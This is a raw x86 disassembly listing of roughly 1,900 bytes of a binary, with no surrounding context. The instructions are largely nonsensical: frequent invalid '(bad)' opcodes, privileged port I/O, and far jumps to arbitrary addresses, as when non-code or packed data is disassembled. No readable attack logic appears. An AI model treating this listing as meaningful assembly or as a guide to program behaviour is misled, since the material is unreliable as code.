  41b57b:	imul   edi,esp,0xfc0d11f1
  41b581:	push   ecx
  41b582:	test   ebx,0x53252672
  41b588:	imul   esi,DWORD PTR [ecx-0x337f987c],0xd79ea785
  41b592:	retf   0x7798
  41b595:	add    DWORD PTR [ebx+0x37ab877b],ebx
  41b59b:	mov    edx,0x50f2c0c7
  41b5a0:	or     edi,edi
  41b5a2:	adc    edx,esp
  41b5a4:	scas   eax,DWORD PTR es:[edi]
  41b5a5:	xchg   esp,eax
  41b5a6:	sahf   
  41b5a7:	outs   dx,BYTE PTR ds:[esi]
  41b5a8:	mov    BYTE PTR [ecx+0x2b],ch
  41b5ab:	sub    BYTE PTR [edx-0x7dfe9798],bh
  41b5b1:	sub    ebp,edi
  41b5b3:	in     eax,dx
  41b5b4:	mov    edi,0x9436c295
  41b5b9:	js     0x41b554
  41b5bb:	adc    ah,ch
  41b5bd:	(bad)
  41b5c0:	nop
  41b5c1:	push   ds
  41b5c2:	cmp    BYTE PTR [edi+eax*2+0x4f],0x24
  41b5c7:	ret    0x1ce6
  41b5ca:	cs pop ebx
  41b5cc:	or     BYTE PTR [ebx],bh
  41b5ce:	jmp    0x867e:0xd302b9b4
  41b5d5:	inc    edx
  41b5d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5d7:	cmp    eax,0x15e02f2b
  41b5dc:	stos   DWORD PTR es:[edi],eax
  41b5dd:	ins    BYTE PTR es:[edi],dx
  41b5de:	push   esp
  41b5df:	daa    
  41b5e0:	data16 sbb al,0x29
  41b5e3:	inc    esp
  41b5e4:	push   ebp
  41b5e5:	xchg   DWORD PTR [eax+eiz*4],ebp
  41b5e8:	(bad)  
  41b5ea:	jne    0x41b63d
  41b5ec:	shl    DWORD PTR [ebx],1
  41b5ee:	stos   DWORD PTR es:[edi],eax
  41b5ef:	xchg   ebx,eax
  41b5f0:	dec    ecx
  41b5f1:	(bad)  
  41b5f2:	and    al,cl
  41b5f4:	xor    eax,0xa352945f
  41b5f9:	lods   al,BYTE PTR ds:[esi]
  41b5fa:	sbb    al,0xc3
  41b5fc:	push   esi
  41b5fd:	in     al,dx
  41b5fe:	mov    al,ds:0x7f778b43
  41b603:	addr16 and al,ah
  41b606:	cdq    
  41b607:	sar    bl,cl
  41b609:	ret    0x1d4c
  41b60c:	push   esp
  41b60d:	xor    eax,0x4ee04e63
  41b612:	in     eax,0x49
  41b614:	push   ecx
  41b615:	imul   ebp,DWORD PTR [edx-0x65],0xffffffc1
  41b619:	xor    eax,0xaded3415
  41b61e:	cmp    BYTE PTR [edi],dl
  41b620:	add    eax,0xdd580d67
  41b625:	aaa    
  41b626:	add    BYTE PTR [ebx-0xbe199d7],ah
  41b62c:	xchg   ecx,eax
  41b62d:	out    0xd9,eax
  41b62f:	or     ebp,ecx
  41b631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b632:	clc    
  41b633:	stos   BYTE PTR es:[edi],al
  41b634:	jbe    0x41b5b9
  41b636:	scas   eax,DWORD PTR es:[edi]
  41b637:	add    BYTE PTR [eax],0x24
  41b63a:	mov    cl,0x98
  41b63c:	aam    0xbf
  41b63e:	pop    eax
  41b63f:	pop    esi
  41b640:	scas   eax,DWORD PTR es:[edi]
  41b641:	neg    BYTE PTR [edi+eax*4]
  41b644:	daa    
  41b645:	retf   
  41b646:	mov    ss,WORD PTR [edx]
  41b648:	scas   eax,DWORD PTR es:[edi]
  41b649:	fs push ss
  41b64b:	arpl   WORD PTR [edx-0x19],sp
  41b64e:	xor    eax,0x74dabc1b
  41b653:	add    bl,ch
  41b655:	push   0xaf99b90
  41b65a:	mov    bh,0xdb
  41b65c:	das    
  41b65d:	jecxz  0x41b691
  41b65f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b660:	cli    
  41b661:	(bad)  
  41b662:	aas    
  41b663:	adc    eax,0xb788f1a1
  41b668:	icebp  
  41b669:	inc    edi
  41b66a:	add    BYTE PTR [ecx+0x2f6aba9],cl
  41b670:	xor    eax,0x68437dd4
  41b675:	cs add eax,0x86217cd
  41b67b:	cmp    al,0x82
  41b67d:	inc    esp
  41b67e:	mov    al,0x27
  41b680:	and    bh,BYTE PTR [ecx-0x43]
  41b683:	sbb    DWORD PTR [eax-0x30],ebp
  41b686:	pop    ebp
  41b687:	pop    edx
  41b688:	adc    BYTE PTR [ecx+0x7],bl
  41b68b:	mov    BYTE PTR [ebp+0x33],ah
  41b68e:	icebp  
  41b68f:	push   eax
  41b690:	sub    eax,0x71e83b3d
  41b695:	idiv   BYTE PTR [eax-0x40]
  41b698:	ror    ebp,cl
  41b69a:	jo     0x41b6b0
  41b69c:	ss stc 
  41b69e:	daa    
  41b69f:	(bad)  
  41b6a0:	cmp    eax,0xefc09fa8
  41b6a5:	fnsave [esi+0x63]
  41b6a8:	cld    
  41b6a9:	pop    edx
  41b6aa:	outs   dx,DWORD PTR ds:[esi]
  41b6ab:	fistp  DWORD PTR ds:0xa227fbfb
  41b6b1:	mov    BYTE PTR [ecx+0x74],dh
  41b6b4:	repz sti 
  41b6b6:	lods   eax,DWORD PTR ds:[esi]
  41b6b7:	xchg   ebx,eax
  41b6b8:	dec    ebp
  41b6b9:	stos   DWORD PTR es:[edi],eax
  41b6ba:	or     edi,DWORD PTR [eax+0x77]
  41b6bd:	cmp    ebx,DWORD PTR [edi+ecx*2+0x55373060]
  41b6c4:	ret    
  41b6c5:	add    ebx,ebx
  41b6c7:	adc    edi,DWORD PTR [esp+esi*4]
  41b6ca:	scas   al,BYTE PTR es:[edi]
  41b6cb:	bound  esp,QWORD PTR [edx]
  41b6cd:	adc    DWORD PTR [edx+0xd8da183],eax
  41b6d3:	add    eax,0x3dc7b226
  41b6d8:	jle    0x41b6b4
  41b6da:	std    
  41b6db:	add    bl,BYTE PTR [eax]
  41b6dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6de:	jmp    0xaa1d:0xb966a172
  41b6e5:	jge    0x41b6b2
  41b6e7:	test   al,0x6c
  41b6e9:	sbb    edx,DWORD PTR [esi]
  41b6eb:	xor    ebx,edx
  41b6ed:	neg    ecx
  41b6ef:	inc    edx
  41b6f0:	dec    esi
  41b6f1:	pop    ebp
  41b6f2:	in     al,dx
  41b6f3:	sahf   
  41b6f4:	ins    DWORD PTR es:[edi],dx
  41b6f5:	inc    esi
  41b6f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6f7:	fadd   st(5),st
  41b6f9:	mov    DWORD PTR [edi+0x6007af23],ebx
  41b6ff:	clc    
  41b700:	test   eax,0x34ec3d92
  41b705:	mov    ds:0xb68ca576,eax
  41b70a:	mov    al,bl
  41b70c:	xor    ah,bh
  41b70e:	clc    
  41b70f:	mov    dl,0xba
  41b711:	mov    DWORD PTR [eax+0x3e7eb968],esi
  41b717:	push   0xa9c2c0cd
  41b71c:	mov    ah,0x5e
  41b71e:	out    dx,eax
  41b71f:	scas   al,BYTE PTR es:[edi]
  41b720:	in     eax,dx
  41b721:	mov    cl,0x4f
  41b723:	fs and ch,cl
  41b726:	push   0x66
  41b728:	jnp    0x41b73c
  41b72a:	sub    DWORD PTR [ecx],ebp
  41b72c:	dec    eax
  41b72d:	fiadd  DWORD PTR [edx+eiz*2+0x263201c0]
  41b734:	cdq    
  41b735:	jmp    0x66d5:0xf8cdedd2
  41b73c:	push   ss
  41b73d:	mov    eax,0xf458d1f1
  41b742:	ror    BYTE PTR [ebx-0x418f6944],cl
  41b748:	int    0xff
  41b74a:	fwait
  41b74b:	ret    0xc4f4
  41b74e:	pop    esi
  41b74f:	add    eax,0xbfc9f5a4
  41b754:	jnp    0x41b7b0
  41b756:	arpl   ax,ax
  41b758:	jb     0x41b6dc
  41b75a:	mov    al,0x2
  41b75c:	shr    DWORD PTR [ebx+0x1767aa25],0xac
  41b763:	(bad)  
  41b764:	imul   ebp,ebp,0xea150ae6
  41b76a:	xchg   ebx,eax
  41b76b:	pushf  
  41b76c:	add    dh,al
  41b76e:	jmp    0x41b7e7
  41b770:	mov    al,ds:0x398ab7e2
  41b775:	repnz bound edx,QWORD PTR [ecx-0x6ada528b]
  41b77c:	sub    DWORD PTR [edx],esp
  41b77e:	ret    0xa4d1
  41b781:	in     al,0xd3
  41b783:	ss call 0x51b91f30
  41b789:	cmp    edi,edi
  41b78b:	cmp    DWORD PTR [ebp-0x22],0x26
  41b78f:	outs   dx,BYTE PTR ds:[esi]
  41b790:	loope  0x41b7bd
  41b792:	adc    DWORD PTR [ebp+0x2e9e44ca],eax
  41b798:	call   0x4f4dc972
  41b79d:	add    BYTE PTR gs:[ecx+0x7],dl
  41b7a1:	xchg   esp,eax
  41b7a2:	push   ebx
  41b7a3:	sub    al,0xe4
  41b7a5:	out    dx,al
  41b7a6:	repz sbb eax,0xa6634831
  41b7ac:	fucom  st(7)
  41b7ae:	(bad)  
  41b7af:	mov    edi,0x2dbc77a4
  41b7b4:	stos   DWORD PTR es:[edi],eax
  41b7b5:	mov    ebp,ecx
  41b7b7:	cmp    DWORD PTR [esp+ecx*8],0xffffffa0
  41b7bb:	sti    
  41b7bc:	stos   BYTE PTR es:[edi],al
  41b7bd:	jmp    0x26e:0x31589d1f
  41b7c4:	mov    cl,0xdb
  41b7c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7c7:	sbb    dl,BYTE PTR [eax-0x1e686a9e]
  41b7cd:	dec    ebx
  41b7ce:	and    eax,0xad10db0a
  41b7d3:	xor    bl,ah
  41b7d5:	aas    
  41b7d6:	add    ebx,eax
  41b7d8:	ds int 0x3d
  41b7db:	push   es
  41b7dc:	sub    ch,dh
  41b7de:	add    dh,BYTE PTR [edx-0x21]
  41b7e1:	fld    DWORD PTR [eax+edi*4+0x1c7804ef]
  41b7e8:	mov    ebx,0x8188f394
  41b7ed:	push   ebx
  41b7ee:	mov    dl,0x97
  41b7f0:	and    al,0x8c
  41b7f2:	addr16 jns 0x41b7ff
  41b7f5:	mov    al,0xae
  41b7f7:	add    cl,ch
  41b7f9:	and    ebp,DWORD PTR cs:[ebx+0x6ae95608]
  41b800:	or     al,0x87
  41b802:	push   cs
  41b803:	(bad)  
  41b804:	and    al,0x62
  41b806:	adc    BYTE PTR [esi-0x76],dl
  41b809:	adc    al,0xf0
  41b80b:	pop    edx
  41b80c:	outs   dx,BYTE PTR ds:[esi]
  41b80d:	jp     0x41b7e6
  41b80f:	mov    al,0x2
  41b811:	xor    BYTE PTR [eax-0x79],ah
  41b814:	in     eax,0xfb
  41b816:	sub    DWORD PTR ds:0x6c754fbe,edi
  41b81c:	push   ss
  41b81d:	sar    al,cl
  41b81f:	arpl   WORD PTR [esp+edx*4+0x91f8bf0],cx
  41b826:	or     dl,0xa3
  41b829:	sub    eax,0x5f540234
  41b82e:	mov    al,cl
  41b830:	and    DWORD PTR [edx+0x2224da1c],eax
  41b836:	fisub  DWORD PTR [esi]
  41b838:	repnz dec esp
  41b83a:	pop    edx
  41b83b:	daa    
  41b83c:	push   ss
  41b83d:	imul   ecx,DWORD PTR [eax+0x39],0xffffffaa
  41b841:	and    dl,al
  41b843:	(bad)  
  41b844:	loopne 0x41b7f4
  41b846:	(bad)  
  41b848:	cmc    
  41b849:	xchg   esi,eax
  41b84a:	lods   eax,DWORD PTR ds:[esi]
  41b84b:	aam    0xfc
  41b84d:	jb     0x41b83d
  41b84f:	inc    ecx
  41b850:	push   edi
  41b851:	mov    ch,0xb4
  41b853:	out    0x7d,al
  41b855:	xchg   esi,eax
  41b856:	push   eax
  41b857:	stos   BYTE PTR es:[edi],al
  41b858:	fild   DWORD PTR ds:0xc409df51
  41b85e:	and    DWORD PTR [ebp+0x7697e32a],ecx
  41b864:	(bad)  
  41b866:	popf   
  41b867:	add    DWORD PTR [esp+ecx*8],eax
  41b86a:	add    al,0x8f
  41b86c:	pushf  
  41b86d:	and    BYTE PTR [esi],cl
  41b86f:	pushf  
  41b870:	inc    ebx
  41b871:	ins    DWORD PTR es:[edi],dx
  41b872:	ja     0x41b8d0
  41b874:	int3   
  41b875:	xchg   esp,eax
  41b876:	xchg   esi,eax
  41b877:	sbb    ebx,DWORD PTR [ebp+0x5e]
  41b87a:	dec    ebp
  41b87b:	and    al,0x89
  41b87d:	pop    esp
  41b87e:	(bad)  
  41b87f:	jg     0x41b8fe
  41b881:	icebp  
  41b882:	fisub  DWORD PTR [eax+0x1c]
  41b885:	pop    edx
  41b886:	mov    al,ds:0x320ba77
  41b88b:	mov    ch,0x1
  41b88d:	or     al,0xcd
  41b88f:	xchg   ecx,eax
  41b890:	dec    esp
  41b891:	xchg   ebp,eax
  41b892:	cmp    BYTE PTR [esi+0x556515cb],dl
  41b898:	in     al,dx
  41b899:	int3   
  41b89a:	jmp    0x34fb8375
  41b89f:	mov    eax,ds:0x5160a7f6
  41b8a4:	retf   
  41b8a5:	mov    DWORD PTR ds:0xcf11dd81,edi
  41b8ab:	mov    ds:0x3911329f,eax
  41b8b0:	cdq    
  41b8b1:	lods   al,BYTE PTR ds:[esi]
  41b8b2:	mov    ds:0xa13929a9,al
  41b8b7:	out    dx,eax
  41b8b8:	stos   BYTE PTR es:[edi],al
  41b8b9:	sub    al,0xc9
  41b8bb:	(bad)  
  41b8bc:	and    eax,0x5f9ed22e
  41b8c1:	call   0x4ecf133e
  41b8c6:	retf   
  41b8c7:	fnsave [edi]
  41b8c9:	cmc    
  41b8ca:	dec    esi
  41b8cb:	outs   dx,DWORD PTR ds:[esi]
  41b8cc:	and    BYTE PTR [ebx],cl
  41b8ce:	xchg   esi,eax
  41b8cf:	popf   
  41b8d0:	sti    
  41b8d1:	leave  
  41b8d2:	mov    ebp,0xecc28a40
  41b8d7:	std    
  41b8d8:	adc    al,0xbf
  41b8da:	jp     0x41b889
  41b8dc:	or     dl,BYTE PTR [edi*4+0x7c3b82e]
  41b8e3:	je     0x41b95d
  41b8e5:	mov    ah,0xab
  41b8e7:	(bad)  
  41b8e8:	or     cl,BYTE PTR [eax]
  41b8ea:	dec    eax
  41b8eb:	(bad)  
  41b8ed:	and    DWORD PTR [ebx+esi*2+0x45],ecx
  41b8f1:	push   ebp
  41b8f2:	in     al,0x66
  41b8f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8f5:	cmp    bh,BYTE PTR [edi-0x36]
  41b8f8:	xor    ecx,DWORD PTR [edi-0x68]
  41b8fb:	mov    edx,0xa8285eef
  41b900:	xor    al,0xd
  41b902:	ja     0x41b89a
  41b904:	(bad)  
  41b905:	jp     0x41b94d
  41b907:	push   eax
  41b908:	xchg   ebp,eax
  41b909:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b90a:	retf   
  41b90b:	and    DWORD PTR [ebx],eax
  41b90d:	lods   eax,DWORD PTR ds:[esi]
  41b90e:	sbb    bl,BYTE PTR [ebx]
  41b910:	repnz bound ebp,QWORD PTR [esi]
  41b913:	mov    ss,WORD PTR [edx-0x297f4f1c]
  41b919:	xor    esp,DWORD PTR [esi+0x5e6cb042]
  41b91f:	pushw  ss
  41b921:	iret   
  41b922:	stos   BYTE PTR es:[edi],al
  41b923:	push   ebp
  41b924:	lea    ebp,[ecx+0x1b0b25d1]
  41b92a:	xor    DWORD PTR gs:[esi-0x5f],ebx
  41b92e:	outs   dx,BYTE PTR ds:[esi]
  41b92f:	push   esp
  41b930:	pop    esp
  41b931:	inc    esi
  41b932:	in     eax,0xac
  41b934:	cmp    DWORD PTR [edi+0x75bf5cc],0x8adb8886
  41b93e:	(bad)  
  41b940:	jnp    0x41b956
  41b942:	push   cs
  41b943:	push   edi
  41b944:	lods   ax,WORD PTR ds:[esi]
  41b946:	adc    al,0x43
  41b948:	aam    0xf7
  41b94a:	fucomp st(4)
  41b94c:	leave  
  41b94d:	fsubr  st,st(5)
  41b94f:	mov    ebx,DWORD PTR [esi-0x5fc776ab]
  41b955:	inc    eax
  41b956:	cdq    
  41b957:	in     eax,dx
  41b958:	pushf  
  41b959:	dec    eax
  41b95a:	fldenv [edx-0x74]
  41b95d:	and    BYTE PTR [ebp-0x36d9f172],dh
  41b963:	inc    ebx
  41b964:	rcr    DWORD PTR [esi],cl
  41b966:	jp     0x41b90a
  41b968:	cwde   
  41b969:	xchg   esp,eax
  41b96a:	sbb    al,0xfc
  41b96c:	push   ss
  41b96d:	das    
  41b96e:	scas   eax,DWORD PTR es:[edi]
  41b96f:	shr    DWORD PTR [esi],0x8c
  41b972:	aas    
  41b973:	inc    edx
  41b974:	repz and ah,BYTE PTR [edx+ecx*4-0x3e7fd89b]
  41b97c:	hlt    
  41b97d:	lock rol DWORD PTR [edx+0x7ae2e0a9],1
  41b984:	aaa    
  41b985:	or     DWORD PTR [ecx],esi
  41b987:	push   cs
  41b988:	aas    
  41b989:	mov    cl,0x7b
  41b98b:	cmp    cl,BYTE PTR [ebx+0x4d]
  41b98e:	das    
  41b98f:	push   ecx
  41b990:	aaa    
  41b991:	push   cs
  41b992:	mov    ebx,0xbb4899c5
  41b997:	sub    eax,0xc8179626
  41b99c:	mov    esp,0xdc0b3ef3
  41b9a1:	lods   al,BYTE PTR ds:[esi]
  41b9a2:	adc    al,0x80
  41b9a4:	in     al,0x9b
  41b9a6:	and    edx,DWORD PTR [ebx+0x1ce1314b]
  41b9ac:	xchg   ebp,eax
  41b9ad:	aas    
  41b9ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9af:	loopne 0x41b96e
  41b9b1:	cmp    cl,cl
  41b9b3:	ins    BYTE PTR es:[di],dx
  41b9b5:	mov    dh,0x64
  41b9b7:	scas   eax,DWORD PTR es:[edi]
  41b9b8:	jp     0x41b953
  41b9ba:	mov    ah,BYTE PTR [eax+edi*8-0x6468f478]
  41b9c1:	pop    esi
  41b9c2:	sbb    al,0x15
  41b9c4:	call   0xb1b4:0x33aa9c97
  41b9cb:	pop    eax
  41b9cc:	ins    BYTE PTR es:[edi],dx
  41b9cd:	mov    WORD PTR [ebx+0x4ff446b5],?
  41b9d3:	add    DWORD PTR [eax+edi*2+0x1],edi
  41b9d7:	push   ebx
  41b9d8:	and    ch,BYTE PTR [ebx-0x1064122b]
  41b9de:	fstp   DWORD PTR [ebx]
  41b9e0:	sbb    esi,DWORD PTR [ecx+0x40]
  41b9e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9e4:	xlat   BYTE PTR ds:[ebx]
  41b9e5:	int3   
  41b9e6:	ret    0x4a93
  41b9e9:	jmp    0x5f0:0x824a7f9c
  41b9f0:	mov    bl,0x3d
  41b9f2:	add    DWORD PTR [eax-0x35f91fef],0xffffffc5
  41b9f9:	cwde   
  41b9fa:	push   ds
  41b9fb:	pop    edx
  41b9fc:	or     DWORD PTR [eax-0x10],eax
  41b9ff:	jecxz  0x41b9f1
  41ba01:	mov    ecx,DWORD PTR [eax+esi*8+0x47]
  41ba05:	mov    dh,0xd
  41ba07:	adc    al,0x2c
  41ba09:	cdq    
  41ba0a:	call   0x5ea15511
  41ba0f:	sub    ah,dl
  41ba11:	xor    al,0x69
  41ba13:	add    eax,0x19d4dfaf
  41ba18:	sub    al,0x68
  41ba1a:	icebp  
  41ba1b:	stos   DWORD PTR es:[edi],eax
  41ba1c:	out    0xa8,eax
  41ba1e:	inc    edx
  41ba1f:	ins    DWORD PTR es:[edi],dx
  41ba20:	xchg   edx,eax
  41ba21:	jge    0x41b9df
  41ba23:	scas   eax,DWORD PTR es:[edi]
  41ba24:	push   0xffffffb6
  41ba26:	test   eax,0x36b9471d
  41ba2b:	and    dl,dl
  41ba2d:	and    dh,BYTE PTR [esi-0x6e]
  41ba30:	dec    edi
  41ba31:	push   esp
  41ba32:	jp     0x41b9c1
  41ba34:	in     al,0xd3
  41ba36:	xor    al,0x7e
  41ba38:	add    al,0xf5
  41ba3a:	sahf   
  41ba3b:	mov    ah,0x95
  41ba3d:	sub    al,0xc4
  41ba3f:	or     cl,BYTE PTR [ecx+eax*4+0x676a2d28]
  41ba46:	lea    esp,fs:[esi+0x7130c344]
  41ba4d:	stos   DWORD PTR es:[edi],eax
  41ba4e:	aad    0xee
  41ba50:	sbb    cl,al
  41ba52:	lods   eax,DWORD PTR ds:[esi]
  41ba53:	jns    0x41ba71
  41ba55:	aaa    
  41ba56:	jbe    0x41ba43
  41ba58:	popf   
  41ba59:	icebp  
  41ba5a:	call   0x4a8f:0x454fe56d
  41ba61:	adc    al,0xb9
  41ba63:	or     edx,DWORD PTR [ebp+0x6f]
  41ba66:	je     0x41ba3b
  41ba68:	or     dh,ah
  41ba6a:	inc    ebp
  41ba6b:	pop    ecx
  41ba6c:	mov    ?,ebp
  41ba6e:	mov    bh,0xb0
  41ba70:	not    BYTE PTR [edi+0x7]
  41ba73:	or     eax,0x18a5edca
  41ba78:	push   0xffffff82
  41ba7a:	das    
  41ba7b:	shl    BYTE PTR [eax-0x67],cl
  41ba7e:	cmp    eax,0x25f8fa12
  41ba83:	push   0x3c26911
  41ba88:	je     0x41ba6e
  41ba8a:	fsubr  DWORD PTR [ebx-0x64]
  41ba8d:	shl    BYTE PTR [esi-0x2a],cl
  41ba90:	sbb    eax,0xae17eb85
  41ba95:	mov    eax,0x8e68be24
  41ba9a:	lea    edx,[edx-0x63e8c195]
  41baa0:	fwait
  41baa1:	mov    ch,0x38
  41baa3:	imul   eax,DWORD PTR [edx+ebp*8+0x5994be61],0x9f0afcd3
  41baae:	rcl    BYTE PTR [edx],0xc5
  41bab1:	sbb    BYTE PTR [ecx-0x5f9a6696],bh
  41bab7:	retf   
  41bab8:	sub    ebx,ecx
  41baba:	mov    ds:0xc5b53748,al
  41babf:	dec    ebp
  41bac0:	fucom  st(1)
  41bac2:	hlt    
  41bac3:	daa    
  41bac4:	add    bh,dh
  41bac6:	mov    ds:0x750a7c75,eax
  41bacb:	mov    edi,0xc1b39603
  41bad0:	fs jo  0x41ba6c
  41bad3:	mov    BYTE PTR [esi-0x43],bh
  41bad6:	aad    0x23
  41bad8:	or     BYTE PTR [edi],bl
  41bada:	jmp    0x6e4d:0xc3e58470
  41bae1:	out    dx,eax
  41bae2:	push   ecx
  41bae3:	stos   BYTE PTR es:[edi],al
  41bae4:	out    0x1,eax
  41bae6:	sar    eax,0xfd
  41bae9:	adc    DWORD PTR [esi-0x22],esi
  41baec:	lods   eax,DWORD PTR ds:[esi]
  41baed:	arpl   WORD PTR [esp+ebx*1-0x65],di
  41baf1:	push   ecx
  41baf2:	cmp    ch,BYTE PTR [ebx]
  41baf4:	rol    al,cl
  41baf6:	add    al,0x82
  41baf8:	rcr    DWORD PTR [edi],cl
  41bafa:	push   edx
  41bafb:	adc    eax,0x4c797b02
  41bb00:	dec    ebp
  41bb01:	and    dh,cl
  41bb03:	cli    
  41bb04:	mov    cl,0x5
  41bb06:	call   0xce00cf13
  41bb0b:	fincstp 
  41bb0d:	repz das 
  41bb0f:	push   edx
  41bb10:	div    DWORD PTR [ebp+0x18]
  41bb13:	test   DWORD PTR [esi],ecx
  41bb15:	mov    ah,0xaf
  41bb17:	mov    ebx,0x52741d00
  41bb1c:	popf   
  41bb1d:	out    0xf1,al
  41bb1f:	xchg   esp,eax
  41bb20:	hlt    
  41bb21:	lock aam 0x39
  41bb24:	mov    esp,0x2222ad6f
  41bb29:	pop    ebp
  41bb2a:	cld    
  41bb2b:	push   0xffffffb9
  41bb2d:	sub    al,0x3e
  41bb2f:	test   BYTE PTR [eax+0x2e],al
  41bb32:	out    dx,al
  41bb33:	dec    ebx
  41bb34:	imul   esi,DWORD PTR [eax],0xe73c4597
  41bb3a:	in     eax,dx
  41bb3b:	dec    esi
  41bb3c:	out    dx,eax
  41bb3d:	xlat   BYTE PTR ds:[ebx]
  41bb3e:	leave  
  41bb3f:	pop    edx
  41bb40:	xchg   BYTE PTR [ebp-0x6d],dl
  41bb43:	jo     0x41bb64
  41bb45:	sar    BYTE PTR ds:0xc869b86d,cl
  41bb4b:	ins    DWORD PTR es:[edi],dx
  41bb4c:	xor    edx,edi
  41bb4e:	into   
  41bb4f:	push   ss
  41bb50:	adc    al,0x31
  41bb52:	sar    DWORD PTR [eax],0x3
  41bb55:	and    edx,ebp
  41bb57:	xchg   BYTE PTR [ecx-0x69ccd242],ah
  41bb5d:	enter  0x96c3,0xee
  41bb61:	icebp  
  41bb62:	mov    dl,0x39
  41bb64:	mov    eax,ds:0xb9572a33
  41bb69:	sbb    al,0xd7
  41bb6b:	sub    BYTE PTR [edx-0x21],cl
  41bb6e:	nop
  41bb6f:	sbb    DWORD PTR [esi-0x33],ebp
  41bb72:	mov    bl,0x82
  41bb74:	fbstp  TBYTE PTR [esi]
  41bb76:	adc    ebx,DWORD PTR [esi-0x57d51eaa]
  41bb7c:	or     esp,DWORD PTR [ecx-0x6a]
  41bb7f:	and    BYTE PTR [edi-0x56],0xcc
  41bb83:	shl    BYTE PTR [eax+0x2fc6615c],0x9a
  41bb8a:	xchg   esi,eax
  41bb8b:	ret    
  41bb8c:	or     bl,ah
  41bb8e:	std    
  41bb8f:	push   edi
  41bb90:	jecxz  0x41bbab
  41bb92:	daa    
  41bb93:	(bad)  
  41bb96:	dec    esp
  41bb97:	adc    BYTE PTR ds:0xe229a2e4,al
  41bb9d:	or     bh,BYTE PTR [ecx+0x71bd793a]
  41bba3:	inc    eax
  41bba4:	inc    esi
  41bba5:	stos   BYTE PTR es:[edi],al
  41bba6:	push   es
  41bba7:	pop    ebx
  41bba8:	dec    eax
  41bba9:	cmp    DWORD PTR [esp+eiz*2+0x46bfa096],0x59
  41bbb1:	sbb    BYTE PTR [ebx+0x6a],0xc9
  41bbb5:	int    0xda
  41bbb7:	loopne 0x41bc1d
  41bbb9:	out    dx,eax
  41bbba:	pop    ss
  41bbbb:	xor    ecx,DWORD PTR [edi]
  41bbbd:	out    dx,al
  41bbbe:	mov    es,eax
  41bbc0:	jne    0x41bb6c
  41bbc2:	ror    DWORD PTR [edi+0x678afbe],cl
  41bbc8:	imul   esi,ecx,0x5695e66c
  41bbce:	in     eax,dx
  41bbcf:	jecxz  0x41bb5c
  41bbd1:	inc    edx
  41bbd2:	out    dx,al
  41bbd3:	or     eax,0x1db3dcb3
  41bbd8:	rol    DWORD PTR [edi+0x1135a4f9],cl
  41bbde:	int3   
  41bbdf:	test   eax,0x9bc92cdd
  41bbe4:	xlat   BYTE PTR ds:[ebx]
  41bbe5:	mov    ds:0xf211442e,al
  41bbea:	dec    ebx
  41bbeb:	nop
  41bbec:	mov    ebp,0x107f7c45
  41bbf1:	add    ch,al
  41bbf3:	in     eax,dx
  41bbf4:	sub    esp,ebx
  41bbf6:	gs xor al,0x21
  41bbf9:	mov    edi,0xb44fe226
  41bbfe:	fcompp 
  41bc00:	xchg   esp,eax
  41bc01:	mov    cl,0x80
  41bc03:	in     al,dx
  41bc04:	jmp    0x41bbe2
  41bc06:	mov    edi,0xf7eb1e20
  41bc0b:	or     BYTE PTR [eax+0x58442668],0xd2
  41bc12:	out    0x17,al
  41bc14:	add    al,0xb9
  41bc16:	and    eax,0xc191a0a6
  41bc1b:	stos   DWORD PTR es:[edi],eax
  41bc1c:	sub    DWORD PTR [ecx-0x41],ebp
  41bc1f:	mov    esi,0x8d908f56
  41bc24:	inc    ebx
  41bc25:	shl    DWORD PTR [eax-0x53],1
  41bc28:	add    ebp,DWORD PTR [eax]
  41bc2a:	adc    al,0xb4
  41bc2c:	xchg   DWORD PTR [edi-0x6e],ebp
  41bc2f:	cmp    ecx,DWORD PTR [ebx+ebp*1+0x65145fd2]
  41bc36:	mov    ecx,0x134a4ff6
  41bc3b:	in     eax,dx
  41bc3c:	call   0xac2898d3
  41bc41:	in     eax,dx
  41bc42:	dec    ecx
  41bc43:	aam    0x15
  41bc45:	sbb    eax,0x6cfffcb5
  41bc4a:	or     al,0x2e
  41bc4c:	dec    eax
  41bc4d:	cdq    
  41bc4e:	int3   
  41bc4f:	and    BYTE PTR [ecx+0x1c],dl
  41bc52:	mov    cl,0x32
  41bc54:	in     eax,dx
  41bc55:	inc    esi
  41bc56:	popa   
  41bc57:	pusha  
  41bc58:	mov    al,ds:0xe1aa2137
  41bc5d:	aam    0x8c
  41bc5f:	mov    al,0x3
  41bc61:	inc    edx
  41bc62:	pop    es
  41bc63:	pop    ss
  41bc64:	fdivr  st,st(5)
  41bc66:	out    0x3d,eax
  41bc68:	hlt    
  41bc69:	leave  
  41bc6a:	js     0x41bc47
  41bc6c:	sub    BYTE PTR [esi*8+0x1544e61d],ch
  41bc73:	rol    DWORD PTR [edi],1
  41bc75:	push   eax
  41bc76:	aam    0x2c
  41bc78:	and    BYTE PTR [edx+0x6c61a1d0],dl
  41bc7e:	and    ebx,DWORD PTR [ecx]
  41bc80:	cmp    BYTE PTR ds:0xac7705b3,0x79
  41bc87:	jnp    0x41bc86
  41bc89:	rol    DWORD PTR [ecx+0x56860ee5],cl
  41bc8f:	mov    bl,0x7d
  41bc91:	push   0x2995b3b8
  41bc96:	sub    eax,0xad3b86b
  41bc9b:	jmp    0xab17:0xe067b097
  41bca2:	leave  
  41bca3:	int    0x83
  41bca5:	jmp    0xd7deb9cb
  41bcaa:	ret    0x2b82
  41bcad:	jp     0x41bca3
  41bcaf:	jae    0x41bc5f
  41bcb1:	and    eax,DWORD PTR [edi+esi*2]
  41bcb4:	pop    esp
  41bcb5:	or     eax,0xba5be718
  41bcba:	popf   
  41bcbb:	push   0xd5508f5d
  41bcc0:	call   0x3c1e:0xa6779b65
  41bcc7:	(bad)  
  41bcc8:	std    
  41bcc9:	mov    ebp,0xcb436bc7
  41bcce:	dec    esi
  41bccf:	scas   eax,DWORD PTR es:[edi]
  41bcd0:	loop   0x41bd32
  41bcd2:	arpl   WORD PTR [ecx-0x4e8b6105],dx
